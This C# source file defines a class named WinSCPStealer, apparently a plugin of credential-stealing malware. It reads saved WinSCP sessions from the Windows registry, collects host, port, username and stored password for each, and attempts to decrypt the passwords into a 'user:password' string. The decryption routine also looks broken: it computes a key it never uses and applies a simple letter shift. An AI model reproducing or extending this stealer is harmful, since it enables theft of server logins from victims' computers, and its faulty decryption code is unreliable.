using System;
using System.Collections.Generic;
using Microsoft.Win32;

namespace Plugin.Apps
{
    public class WinSCPStealer
    {
        private const string RegistryPath = @"Software\Martin Prikryl\WinSCP 2\Sessions";
        
        public static List<WinSCPCredential> ExtractCredentials()
        {
            List<WinSCPCredential> credentials = new List<WinSCPCredential>();
            
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegistryPath))
                {
                    if (key == null)
                        return credentials;
                    
                    string[] sessionNames = key.GetSubKeyNames();
                    
                    foreach (string sessionName in sessionNames)
                    {
                        try
                        {
                            using (RegistryKey sessionKey = key.OpenSubKey(sessionName))
                            {
                                if (sessionKey == null)
                                    continue;
                                
                                WinSCPCredential cred = new WinSCPCredential();
                                cred.SessionName = sessionName;
                                
                                object hostObj = sessionKey.GetValue("HostName");
                                if (hostObj != null) cred.Host = hostObj.ToString();
                                
                                object portObj = sessionKey.GetValue("PortNumber");
                                if (portObj != null) cred.Port = portObj.ToString();
                                
                                object userObj = sessionKey.GetValue("UserName");
                                if (userObj != null) cred.Username = userObj.ToString();
                                
                                object passObj = sessionKey.GetValue("Password");
                                if (passObj != null)
                                {
                                    string encryptedPass = passObj.ToString();
                                    cred.EncryptedPassword = encryptedPass;
                                    
                                    // WinSCP uses custom encryption, decrypt if possible
                                    try
                                    {
                                        cred.Password = DecryptWinSCPPassword(cred.Username, encryptedPass);
                                    }
                                    catch
                                    {
                                        cred.Password = "[Encrypted]";
                                    }
                                }
                                
                                if (!string.IsNullOrEmpty(cred.Host))
                                {
                                    credentials.Add(cred);
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }
            
            return credentials;
        }
        
        private static string DecryptWinSCPPassword(string username, string encryptedPassword)
        {
            // WinSCP password decryption algorithm
            // Based on: https://github.com/anoopengineer/winscppasswd
            
            if (string.IsNullOrEmpty(encryptedPassword))
                return string.Empty;
            
            try
            {
                string key = username + "HOSTNAME";
                char[] pass = encryptedPassword.ToCharArray();
                
                int shift = pass[0] - 'A';
                if (shift < 0 || shift > 25)
                    return "[Invalid]";
                
                string decrypted = string.Empty;
                
                for (int i = 1; i < pass.Length; i++)
                {
                    int val = pass[i] - shift - 'A';
                    if (val < 0) val += 26;
                    
                    decrypted += (char)('A' + val);
                }
                
                return decrypted;
            }
            catch
            {
                return "[Decrypt Failed]";
            }
        }
    }
    
    public class WinSCPCredential
    {
        public string SessionName { get; set; }
        public string Host { get; set; }
        public string Port { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }
        public string EncryptedPassword { get; set; }
        
        public override string ToString()
        {
            return $"{SessionName} | {Host}:{Port} | {Username}:{Password}";
        }
    }
}
